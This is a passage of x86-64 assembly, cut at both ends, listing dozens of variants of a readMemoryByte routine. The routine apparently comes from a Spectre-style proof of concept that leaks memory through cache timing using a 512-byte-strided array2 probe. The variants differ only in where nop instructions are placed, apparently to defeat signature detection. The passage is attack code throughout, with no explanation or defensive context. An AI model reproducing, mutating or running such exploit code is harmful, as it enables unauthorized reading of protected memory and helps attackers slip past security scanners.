	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 22
.LreadMemoryByte_win7_var22:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 23
.LreadMemoryByte_win7_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 24
.LreadMemoryByte_win7_var24:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 25
.LreadMemoryByte_win7_var25:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 26
.LreadMemoryByte_win7_var26:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 27
.LreadMemoryByte_win7_var27:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 28
.LreadMemoryByte_win7_var28:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 29
.LreadMemoryByte_win7_var29:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 30
.LreadMemoryByte_win7_var30:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 31
.LreadMemoryByte_win7_var31:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 32
.LreadMemoryByte_win7_var32:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 33
.LreadMemoryByte_win7_var33:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 34
.LreadMemoryByte_win7_var34:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 35
.LreadMemoryByte_win7_var35:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 36
.LreadMemoryByte_win7_var36:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 37
.LreadMemoryByte_win7_var37:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 38
.LreadMemoryByte_win7_var38:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 39
.LreadMemoryByte_win7_var39:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 40
.LreadMemoryByte_win7_var40:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 41
.LreadMemoryByte_win7_var41:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 42
.LreadMemoryByte_win7_var42:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 43
.LreadMemoryByte_win7_var43:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 44
.LreadMemoryByte_win7_var44:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 45
.LreadMemoryByte_win7_var45:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 46
.LreadMemoryByte_win7_var46:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 47
.LreadMemoryByte_win7_var47:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 48
.LreadMemoryByte_win7_var48:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 49
.LreadMemoryByte_win7_var49:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 50
.LreadMemoryByte_win7_var50:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 51
.LreadMemoryByte_win7_var51:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 52
.LreadMemoryByte_win7_var52:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 53
.LreadMemoryByte_win7_var53:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 54
.LreadMemoryByte_win7_var54:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 55
.LreadMemoryByte_win7_var55:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 56
.LreadMemoryByte_win7_var56:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 57
.LreadMemoryByte_win7_var57:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 58
.LreadMemoryByte_win7_var58:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 59
.LreadMemoryByte_win7_var59:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 60
.LreadMemoryByte_win7_var60:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 61
.LreadMemoryByte_win7_var61:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 62
.LreadMemoryByte_win7_var62:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 63
.LreadMemoryByte_win7_var63:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 64
.LreadMemoryByte_win7_var64:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 65
.LreadMemoryByte_win7_var65:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 66
.LreadMemoryByte_win7_var66:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 67
.LreadMemoryByte_win7_var67:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 68
.LreadMemoryByte_win7_var68:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 69
.LreadMemoryByte_win7_var69:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 70
.LreadMemoryByte_win7_var70:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 71
.LreadMemoryByte_win7_var71:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 72
.LreadMemoryByte_win7_var72:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 73
.LreadMemoryByte_win7_var73:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 74
.LreadMemoryByte_win7_var74:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 75
.LreadMemoryByte_win7_var75:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 76
.LreadMemoryByte_win7_var76:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 77
.LreadMemoryByte_win7_var77:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 78
.LreadMemoryByte_win7_var78:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 79
.LreadMemoryByte_win7_var79:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 80
.LreadMemoryByte_win7_var80:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 81
.LreadMemoryByte_win7_var81:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 82
.LreadMemoryByte_win7_var82:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 83
.LreadMemoryByte_win7_var83:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 84
.LreadMemoryByte_win7_var84:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 85
.LreadMemoryByte_win7_var85:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 86
.LreadMemoryByte_win7_var86:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 87
.LreadMemoryByte_win7_var87:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 88
.LreadMemoryByte_win7_var88:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 89
.LreadMemoryByte_win7_var89:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 90
.LreadMemoryByte_win7_var90:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 91
.LreadMemoryByte_win7_var91:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 92
.LreadMemoryByte_win7_var92:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 93
.LreadMemoryByte_win7_var93:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 94
.LreadMemoryByte_win7_var94:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 95
.LreadMemoryByte_win7_var95:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 96
.LreadMemoryByte_win7_var96:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
